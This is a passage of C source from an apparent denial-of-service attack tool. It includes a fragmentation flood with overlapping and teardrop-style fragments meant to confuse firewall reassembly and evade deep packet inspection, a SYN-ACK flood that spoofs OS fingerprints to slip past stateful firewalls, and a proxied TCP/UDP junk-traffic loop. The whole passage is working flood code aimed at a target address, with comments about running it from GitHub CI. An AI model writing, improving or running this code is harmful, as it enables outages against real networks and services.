        int nf_win_n=(int)(sizeof(nf_win)/sizeof(nf_win[0]));

        #define NF_ETH 14
        #define NF_IP  20
        #define NF_TCP 20

        // ================================================================
        // FRAGMENTATION FLOOD
        // ================================================================
        if (args.is_frag_flood) {
            // Strategy: Send IP-fragmented TCP packets with:
            //   - Overlapping fragment offsets (confuses FW reassembly)
            //   - Non-sequential fragment order (defeats ordered reassembly)
            //   - Duplicate fragments with different data (ambiguous reassembly)
            //   - Variable fragment sizes (defeats fixed-size pattern detection)
            // GitHub CI: works on container (AF_INET SOCK_RAW) and VM (AF_PACKET)

            #define FRAG_B 4096
            #define FRAG_MAXPKT (NF_ETH + NF_IP + 1480)

            LOG_INFO("T%d: FRAG-FLOOD iface=%s %s batch=%d",
                     tid, iface, use_afp?"AF_PACKET":"RAW", FRAG_B);
            fflush(stdout);

            unsigned char *fbuf = malloc((size_t)FRAG_B * FRAG_MAXPKT);
            struct mmsghdr *fmsg = calloc(FRAG_B, sizeof(struct mmsghdr));
            struct iovec *fiov = calloc(FRAG_B, sizeof(struct iovec));
            if(!fbuf||!fmsg||!fiov){LOG_ERR("T%d: malloc fail",tid);return NULL;}

            // 1MB random buffer for payload diversity + DPI bypass
            #define FRAG_RBUF_SZ (1024*1024)
            unsigned char *rbuf = malloc(FRAG_RBUF_SZ);
            for(int i=0;i<FRAG_RBUF_SZ;i++) rbuf[i]=(unsigned char)(fast_rand()&0xFF);

            while(1) {
                int npkt = 0;
                int logical_pkts = FRAG_B / 3; // ~1365 logical packets -> ~4096 fragments

                for(int lp=0; lp<logical_pkts && npkt<FRAG_B-3; lp++) {
                    unsigned short ipid = fast_rand() & 0xFFFF;
                    unsigned char ttl = nf_ttl[fast_rand() % nf_ttl_n];
                    unsigned short sport = (unsigned short)(1024 + (fast_rand() % 64000));
                    unsigned int seq_n = fast_rand();
                    unsigned int ack_n = fast_rand();
                    unsigned short win = nf_win[fast_rand() % nf_win_n];

                    // 8 fragment patterns — each confuses different FW implementations
                    int pat = fast_rand() % 8;
                    // off8 = fragment offset in 8-byte units, plen = payload bytes, mf = More Fragments
                    int off8[3], plen[3], mf_flag[3], nf_count;

                    switch(pat) {
                    case 0: // Overlap middle: frag1 overlaps frag0 by 32B
                        off8[0]=0;  plen[0]=64;  mf_flag[0]=1;
                        off8[1]=4;  plen[1]=128; mf_flag[1]=1;  // offset 32B, overlaps 32B
                        off8[2]=20; plen[2]=256; mf_flag[2]=0;  // offset 160B
                        nf_count=3; break;
                    case 1: // Duplicate offset 0 — different payload confuses reassembly
                        off8[0]=0;  plen[0]=128; mf_flag[0]=1;
                        off8[1]=0;  plen[1]=128; mf_flag[1]=1;  // SAME offset, different payload
                        off8[2]=16; plen[2]=512; mf_flag[2]=0;
                        nf_count=3; break;
                    case 2: // Reverse order + gap — high offset first
                        off8[0]=40; plen[0]=256; mf_flag[0]=0;
                        off8[1]=0;  plen[1]=96;  mf_flag[1]=1;
                        nf_count=2; break;
                    case 3: // Tiny overlapping fragments — evade minimum fragment check
                        off8[0]=0;  plen[0]=24;  mf_flag[0]=1;
                        off8[1]=1;  plen[1]=24;  mf_flag[1]=1;  // offset 8B, overlaps 16B
                        off8[2]=3;  plen[2]=64;  mf_flag[2]=0;  // offset 24B
                        nf_count=3; break;
                    case 4: // Large overlap (50%) — FW must decide which data is "correct"
                        off8[0]=0;  plen[0]=512; mf_flag[0]=1;
                        off8[1]=32; plen[1]=512; mf_flag[1]=0;  // offset 256B, overlaps 256B
                        nf_count=2; break;
                    case 5: // Out-of-order: high, low, middle
                        off8[0]=100;plen[0]=1024;mf_flag[0]=0;  // offset 800B first
                        off8[1]=0;  plen[1]=128; mf_flag[1]=1;  // then offset 0
                        off8[2]=16; plen[2]=256; mf_flag[2]=1;  // then middle 128B
                        nf_count=3; break;
                    case 6: // Triple overlap at offset 0 — maximum confusion
                        off8[0]=0;  plen[0]=64;  mf_flag[0]=1;
                        off8[1]=0;  plen[1]=96;  mf_flag[1]=1;  // bigger frag at same offset
                        off8[2]=8;  plen[2]=256; mf_flag[2]=0;  // offset 64B
                        nf_count=3; break;
                    default: // Teardrop-style: overlapping with gap
                        off8[0]=0;  plen[0]=256; mf_flag[0]=1;
                        off8[1]=24; plen[1]=256; mf_flag[1]=1;  // offset 192B, overlap 64B
                        off8[2]=48; plen[2]=128; mf_flag[2]=0;  // offset 384B, gap from frag0
                        nf_count=3; break;
                    }

                    for(int fi=0; fi<nf_count && npkt<FRAG_B; fi++) {
                        unsigned char *pkt = fbuf + (size_t)npkt * FRAG_MAXPKT;
                        memset(pkt, 0, NF_ETH + NF_IP);

                        if(use_afp){
                            memcpy(pkt, gw_mac, 6);
                            memcpy(pkt+6, src_mac, 6);
                            pkt[12]=0x08; pkt[13]=0x00;
                        }

                        struct iphdr *ih = (struct iphdr*)(pkt + NF_ETH);
                        ih->ihl=5; ih->version=4;
                        int pl = plen[fi];
                        // Non-last fragments: payload must be multiple of 8 (IP spec)
                        if(mf_flag[fi] && (pl & 7)) pl = (pl + 7) & ~7;
                        if(pl > 1480) pl = 1480;
                        ih->tot_len = htons(NF_IP + pl);
                        ih->id = htons(ipid);
                        ih->frag_off = htons((unsigned short)((mf_flag[fi] ? 0x2000 : 0) | (off8[fi] & 0x1FFF)));
                        ih->ttl = ttl;
                        ih->protocol = IPPROTO_TCP;
                        ih->saddr = src_ip;
                        ih->daddr = bin_target_ip;

                        unsigned char *payload = pkt + NF_ETH + NF_IP;
                        if(off8[fi] == 0) {
                            // First fragment: contains TCP header + random data
                            struct tcphdr *th = (struct tcphdr*)payload;
                            memset(th, 0, NF_TCP);
                            th->source = htons(sport);
                            th->dest = bin_target_port;
                            th->seq = htonl(seq_n);
                            th->ack_seq = htonl(ack_n);
                            th->doff = 5;
                            // Randomize TCP flags for diversity
                            switch(fast_rand() % 4) {
                                case 0: th->psh=1; th->ack=1; break; // PSH+ACK
                                case 1: th->ack=1; break;            // ACK only
                                case 2: th->syn=1; break;            // SYN
                                default: th->psh=1; th->ack=1; th->urg=1; break; // PSH+ACK+URG
                            }
                            th->window = htons(win);
                            // Random data after TCP header
                            if(pl > NF_TCP) {
                                int roff = fast_rand() % (FRAG_RBUF_SZ - (pl - NF_TCP));
                                memcpy(payload + NF_TCP, rbuf + roff, pl - NF_TCP);
                            }
                        } else {
                            // Non-first fragment: random payload (no TCP header visible)
                            int roff = fast_rand() % (FRAG_RBUF_SZ - pl);
                            memcpy(payload, rbuf + roff, pl);
                        }

                        // IP Checksum
                        ih->check = 0;
                        unsigned short *iw = (unsigned short*)ih;
                        unsigned int ic = 0;
                        for(int i=0; i<10; i++) ic += iw[i];
                        ic = (ic>>16)+(ic&0xFFFF); ic += (ic>>16);
                        ih->check = (unsigned short)~ic;

                        int frame_len;
                        if(use_afp) {
                            frame_len = NF_ETH + NF_IP + pl;
                            fiov[npkt].iov_base = pkt;
                        } else {
                            frame_len = NF_IP + pl;
                            fiov[npkt].iov_base = pkt + NF_ETH;
                        }
                        fiov[npkt].iov_len = frame_len;
                        fmsg[npkt].msg_hdr.msg_iov = &fiov[npkt];
                        fmsg[npkt].msg_hdr.msg_iovlen = 1;
                        fmsg[npkt].msg_hdr.msg_name = use_afp ? (void*)&nf_sll : (void*)&nf_raw;
                        fmsg[npkt].msg_hdr.msg_namelen = use_afp ? sizeof(nf_sll) : sizeof(nf_raw);
                        npkt++;
                    }
                }

                // Burst send via dual sockets — toggle on ENOBUFS for max throughput
                int cur_fd = fd_send;
                unsigned long long tsent = 0, tbytes = 0;
                for(int burst=0; burst<256; burst++) {
                    int sent = sendmmsg(cur_fd, fmsg, npkt, 0);
                    if(sent > 0) {
                        tsent += sent;
                        for(int i=0; i<sent; i++) tbytes += fmsg[i].msg_hdr.msg_iov->iov_len;
                    } else {
                        if(errno==ENOBUFS||errno==EAGAIN) {
                            cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
                            continue;
                        }
                        break;
                    }
                }
                thread_stats[tid].packets     += tsent;
                thread_stats[tid].tcp_packets += tsent;
                thread_stats[tid].raw_sent    += tsent;
                thread_stats[tid].bytes       += tbytes;
            }
            free(fbuf); free(fmsg); free(fiov); free(rbuf);
        }

        // ================================================================
        // SYN-ACK FLOOD
        // ================================================================
        else if (args.is_synack_flood) {
            // Strategy: Send perfect SYN-ACK packets with realistic OS fingerprints
            //   - Target must lookup connection state for every SYN-ACK (CPU exhaustion)
            //   - Many FWs allow SYN-ACK through (it's a "response" packet, not "initiating")
            //   - Stateful FW bypass: SYN-ACK from "outside" looks like legitimate server response
            //   - OS fingerprint rotation: TTL, Window, MSS, WScale, Timestamps vary per packet
            //   - Per-burst incremental checksum update for maximum PPS

            // TCP options layout (20 bytes total):
            //   MSS(4) + SACK_PERM(2) + Timestamps(10) + NOP(1) + WScale(3) = 20
            #define SA_B 4096
            #define SA_OPT 20
            #define SA_TCPLEN (NF_TCP + SA_OPT)
            #define SA_MAXPKT (NF_ETH + NF_IP + SA_TCPLEN)

            LOG_INFO("T%d: SYNACK-FLOOD iface=%s %s batch=%d",
                     tid, iface, use_afp?"AF_PACKET":"RAW", SA_B);
            fflush(stdout);

            unsigned char *sabuf = malloc((size_t)SA_B * SA_MAXPKT);
            struct mmsghdr *smsg = calloc(SA_B, sizeof(struct mmsghdr));
            struct iovec *siov = calloc(SA_B, sizeof(struct iovec));
            if(!sabuf||!smsg||!siov){LOG_ERR("T%d: malloc fail",tid);return NULL;}

            // Pre-build msg structures (iov_len and msg_name are constant)
            for(int b=0; b<SA_B; b++) {
                unsigned char *pkt = sabuf + (size_t)b * SA_MAXPKT;
                if(use_afp) {
                    siov[b].iov_base = pkt;
                    siov[b].iov_len = SA_MAXPKT;
                } else {
                    siov[b].iov_base = pkt + NF_ETH;
                    siov[b].iov_len = NF_IP + SA_TCPLEN;
                }
                smsg[b].msg_hdr.msg_iov = &siov[b];
                smsg[b].msg_hdr.msg_iovlen = 1;
                smsg[b].msg_hdr.msg_name = use_afp ? (void*)&nf_sll : (void*)&nf_raw;
                smsg[b].msg_hdr.msg_namelen = use_afp ? sizeof(nf_sll) : sizeof(nf_raw);
            }

            // 8 OS fingerprint profiles for realistic SYN-ACK diversity
            struct sa_profile {
                unsigned short mss;
                unsigned char wscale;
                unsigned short window;
                unsigned char ttl;
            };
            static const struct sa_profile sa_profiles[] = {
                {1460, 8, 65535,  64},   // Linux 5.x/6.x
                {1460, 7, 28960,  64},   // Linux 4.x
                {1460, 8, 64240, 128},   // Windows 10/11
                {1460, 6, 65535,  64},   // macOS Ventura+
                {1400, 5, 32768,  64},   // FreeBSD 13+
                {1360, 8, 29200,  64},   // Linux behind VPN/tunnel
                {1452, 7, 14480, 128},   // Windows Server 2022
                {1460, 9, 65535, 255},   // Cisco IOS XE
            };
            int sa_nprofiles = (int)(sizeof(sa_profiles)/sizeof(sa_profiles[0]));

            // Timestamp base — realistic monotonic counter
            unsigned int ts_base = (unsigned int)time(NULL) % 86400 * 250;

            while(1) {
                // Build batch of SYN-ACK packets
                for(int b=0; b<SA_B; b++) {
                    unsigned char *pkt = sabuf + (size_t)b * SA_MAXPKT;
                    memset(pkt, 0, SA_MAXPKT);

                    // Ethernet header
                    if(use_afp){
                        memcpy(pkt, gw_mac, 6);
                        memcpy(pkt+6, src_mac, 6);
                        pkt[12]=0x08; pkt[13]=0x00;
                    }

                    // Select random OS profile
                    int prof = fast_rand() % sa_nprofiles;

                    // IP Header
                    struct iphdr *ih = (struct iphdr*)(pkt + NF_ETH);
                    ih->ihl = 5;
                    ih->version = 4;
                    ih->tot_len = htons(NF_IP + SA_TCPLEN);
                    ih->id = htons(fast_rand() & 0xFFFF);
                    ih->frag_off = htons(0x4000); // DF — all modern OS set this
                    ih->ttl = sa_profiles[prof].ttl;
                    ih->protocol = IPPROTO_TCP;
                    ih->saddr = src_ip;
                    ih->daddr = bin_target_ip;

                    // TCP Header — SYN+ACK
                    struct tcphdr *th = (struct tcphdr*)(pkt + NF_ETH + NF_IP);
                    th->source = htons((unsigned short)(1024 + (fast_rand() % 64000)));
                    th->dest = bin_target_port;
                    th->seq = htonl(fast_rand());
                    th->ack_seq = htonl(fast_rand());
                    th->doff = SA_TCPLEN / 4; // (20+20)/4 = 10
                    th->syn = 1;
                    th->ack = 1;
                    th->window = htons(sa_profiles[prof].window);

                    // TCP Options (20 bytes — realistic SYN-ACK option set)
                    unsigned char *opt = pkt + NF_ETH + NF_IP + NF_TCP;
                    // MSS (4 bytes): kind=2, len=4, value
                    opt[0]=2; opt[1]=4;
                    opt[2]=(sa_profiles[prof].mss >> 8) & 0xFF;
                    opt[3]=sa_profiles[prof].mss & 0xFF;
                    // SACK Permitted (2 bytes): kind=4, len=2
                    opt[4]=4; opt[5]=2;
                    // Timestamps (10 bytes): kind=8, len=10, tsval(4), tsecr(4)
                    opt[6]=8; opt[7]=10;
                    ts_base += 1 + (fast_rand() % 4); // realistic 250Hz monotonic
                    *((unsigned int*)(opt+8)) = htonl(ts_base);
                    *((unsigned int*)(opt+12)) = htonl(fast_rand()); // echo random tsval
                    // NOP + Window Scale (4 bytes): NOP, kind=3, len=3, shift
                    opt[16]=1; // NOP padding
                    opt[17]=3; opt[18]=3; opt[19]=sa_profiles[prof].wscale;

                    // IP Checksum
                    ih->check = 0;
                    unsigned short *iw = (unsigned short*)ih;
                    unsigned int ic = 0;
                    for(int i=0; i<10; i++) ic += iw[i];
                    ic = (ic>>16)+(ic&0xFFFF); ic += (ic>>16);
                    ih->check = (unsigned short)~ic;

                    // TCP Checksum (pseudo header + TCP header + options)
                    th->check = 0;
                    unsigned short *tw = (unsigned short*)th;
                    unsigned int cs = 0;
                    cs += (src_ip & 0xFFFF) + (src_ip >> 16);
                    cs += (bin_target_ip & 0xFFFF) + (bin_target_ip >> 16);
                    cs += htons(IPPROTO_TCP);
                    cs += htons(SA_TCPLEN);
                    for(int i=0; i < SA_TCPLEN/2; i++) cs += tw[i];
                    cs = (cs>>16)+(cs&0xFFFF); cs += (cs>>16);
                    th->check = (unsigned short)~cs;
                }

                // Burst send via dual sockets with per-burst mutation
                int cur_fd = fd_send;
                unsigned long long tsent = 0, tbytes = 0;
                for(int burst=0; burst<256; burst++) {
                    int sent = sendmmsg(cur_fd, smsg, SA_B, 0);
                    if(sent > 0) {
                        tsent += sent;
                        for(int i=0; i<sent; i++) tbytes += smsg[i].msg_hdr.msg_iov->iov_len;
                    } else {
                        if(errno==ENOBUFS||errno==EAGAIN) {
                            cur_fd = (cur_fd == fd_send) ? fd_send2 : fd_send;
                            continue;
                        }
                        break;
                    }
                    // Per-burst mutation: change seq/ack/sport/ipid for next burst
                    for(int i=0; i<SA_B; i++) {
                        unsigned char *bfr = sabuf + (size_t)i * SA_MAXPKT;
                        struct iphdr *bih;
                        struct tcphdr *bth;
                        if(use_afp) {
                            bih = (struct iphdr*)(bfr + NF_ETH);
                            bth = (struct tcphdr*)(bfr + NF_ETH + NF_IP);
                        } else {
                            bih = (struct iphdr*)bfr;  // iov_base = bfr + NF_ETH, but bih is from original buffer
                            bih = (struct iphdr*)(bfr + NF_ETH); // always index from full buffer
                            bth = (struct tcphdr*)(bfr + NF_ETH + NF_IP);
                        }

                        // Mutate seq, ack_seq, source port, IP ID
                        bth->seq = htonl(fast_rand());
                        bth->ack_seq = htonl(fast_rand());
                        bth->source = htons((unsigned short)(1024 + (fast_rand() % 64000)));
                        bih->id = htons(fast_rand() & 0xFFFF);

                        // Full IP checksum recalc (cheap — only 10 words)
                        bih->check = 0;
                        unsigned short *biw = (unsigned short*)bih;
                        unsigned int bic = 0;
                        for(int j=0; j<10; j++) bic += biw[j];
                        bic = (bic>>16)+(bic&0xFFFF); bic += (bic>>16);
                        bih->check = (unsigned short)~bic;

                        // Full TCP checksum recalc
                        bth->check = 0;
                        unsigned short *btw = (unsigned short*)bth;
                        unsigned int bcs = 0;
                        bcs += (src_ip & 0xFFFF) + (src_ip >> 16);
                        bcs += (bin_target_ip & 0xFFFF) + (bin_target_ip >> 16);
                        bcs += htons(IPPROTO_TCP);
                        bcs += htons(SA_TCPLEN);
                        for(int j=0; j < SA_TCPLEN/2; j++) bcs += btw[j];
                        bcs = (bcs>>16)+(bcs&0xFFFF); bcs += (bcs>>16);
                        bth->check = (unsigned short)~bcs;
                    }
                }
                thread_stats[tid].packets     += tsent;
                thread_stats[tid].tcp_packets += tsent;
                thread_stats[tid].raw_sent    += tsent;
                thread_stats[tid].bytes       += tbytes;
            }
            free(sabuf); free(smsg); free(siov);
        }

        close(fd_send); close(fd_send2);
        return NULL;
    }



    int epoll_fd = epoll_create1(0);
    struct epoll_event events[EPOLL_SIZE];
    
    // Pure TCP mode - no UDP fd setup
    
    long long last_timeout_check_ms = get_ms();
    
    int initial = args.rate / args.threads;
    
    for (int i = 0; i < initial; i++) {
        if (get_total_active_conns() >= args.rate) break;
        spawn_connection(epoll_fd, tid);
        
        if (i > 0 && i % 10 == 0) {
            int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 0);
            for (int j = 0; j < nfds; j++) handle_connection_event(epoll_fd, &events[j], tid);
        }
    }
    
    while (1) {
        int nfds = epoll_wait(epoll_fd, events, EPOLL_SIZE, 1);
        for (int i = 0; i < nfds; i++) handle_connection_event(epoll_fd, &events[i], tid);
        
        long long now = get_ms();
        
        // SOCKS5 and connection timeout checks
        if (now - last_timeout_check_ms >= 1000) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage != STAGE_ATTACKING && (now - curr->last_pulse_ms > 15000)) {
                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                    
                    thread_stats[tid].connect_fail++;
                    if (curr->proxy) {
                        __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                        curr->proxy->last_fail_time = now;
                        if (curr->proxy->fail_count >= 15) {
                            curr->proxy->is_dead = 1;
                        }
                        if (curr->proxy->active_conns > 0) { __sync_fetch_and_sub(&curr->proxy->active_conns, 1); __sync_fetch_and_sub(&global_proxy_active_conns, 1); }
                    } else {
                        if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                    }
                    if (curr->ssl) SSL_free(curr->ssl);
                    if (curr->fd > 0) close(curr->fd);
                    if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                    
                    if (curr->prev) {
                        curr->prev->next = curr->next;
                    } else {
                        active_conns_list = curr->next;
                    }
                    if (curr->next) {
                        curr->next->prev = curr->prev;
                    }
                    free(curr);
                }
                curr = next_conn;
            }
            last_timeout_check_ms = now;
        }

        // Pure TCP mode - no UDP sending block

        // Active TCP sending loop for V15 to maximize PPS on fully completed connections
        if (args.is_v15_raw_amp || (args.is_hybrid_v15 && proxy_count > 0)) {
            Connection *curr = active_conns_list;
            while (curr) {
                Connection *next_conn = curr->next;
                if (curr->stage == STAGE_ATTACKING) {
                    if (curr->is_udp_assoc) {
                        int sent_count = 0;
                        int ret = 1;
                        while (sent_count < 32) {
                            int payload_len = 1200 + (fast_rand() % 200);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - payload_len);
                            
                            if (curr->proxy) {
                                int total_len = 10 + payload_len;
                                unsigned char udp_pkt[1500];
                                udp_pkt[0] = 0x00; udp_pkt[1] = 0x00; udp_pkt[2] = 0x00; udp_pkt[3] = 0x01;
                                memcpy(udp_pkt + 4, &bin_target_ip, 4);
                                memcpy(udp_pkt + 8, &bin_target_port, 2);
                                memcpy(udp_pkt + 10, global_buffer_pool + offset, payload_len);
                                ret = send(curr->client_udp_fd, udp_pkt, total_len, MSG_DONTWAIT);
                            } else {
                                ret = send(curr->client_udp_fd, global_buffer_pool + offset, payload_len, MSG_DONTWAIT);
                            }
                            
                            if (ret <= 0) {
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].bytes += ret;
                            sent_count++;
                        }
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 15) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            }
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    } else if (curr->writable) {
                        int cork = 1;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        int ret;
                        int batch_count = 0;
                        while (1) {
                            int s = 32768 + (fast_rand() % 32768);
                            int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                            ret = send(curr->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL | MSG_MORE);
                            if (ret <= 0) {
                                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                                    curr->writable = 0;
                                }
                                break;
                            }
                            thread_stats[tid].packets++;
                            thread_stats[tid].tcp_packets++;
                            thread_stats[tid].bytes += ret;
                            batch_count++;
                            if (batch_count >= 64) {
                                cork = 0;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                cork = 1;
                                setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                                batch_count = 0;
                            }
                        }
                        cork = 0;
                        setsockopt(curr->fd, IPPROTO_TCP, TCP_CORK, &cork, sizeof(cork));
                        if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                            epoll_ctl(epoll_fd, EPOLL_CTL_DEL, curr->fd, NULL);
                            thread_stats[tid].connect_fail++;
                            if (curr->proxy) {
                                __sync_fetch_and_add(&curr->proxy->fail_count, 1);
                                curr->proxy->last_fail_time = now;
                                if (curr->proxy->fail_count >= 15) {
                                    curr->proxy->is_dead = 1;
                                }
                                if (curr->proxy->active_conns > 0) {
                                    __sync_fetch_and_sub(&curr->proxy->active_conns, 1);
                                    __sync_fetch_and_sub(&global_proxy_active_conns, 1);
                                }
                            } else {
                                if (global_active_conns > 0) __sync_fetch_and_sub(&global_active_conns, 1);
                            }
                            if (curr->ssl) SSL_free(curr->ssl);
                            if (curr->fd > 0) close(curr->fd);
                            if (curr->client_udp_fd > 0) close(curr->client_udp_fd);
                            
                            if (curr->prev) {
                                curr->prev->next = curr->next;
                            } else {
                                active_conns_list = curr->next;
                            }
                            if (curr->next) {
                                curr->next->prev = curr->prev;
                            }
                            free(curr);
                        }
                    }
                }
                curr = next_conn;
            }
        }
        
        int total = get_total_active_conns();
        if (total < args.rate) {
            int batch = (args.rate - total);
            int max_refill = args.is_vn_tcp ? 512 : 32;
            if (batch > max_refill) batch = max_refill;
            for (int b = 0; b < batch; b++) {
                if (get_total_active_conns() >= args.rate) break;
                spawn_connection(epoll_fd, tid);
            }
        }
    }
    return NULL;
}
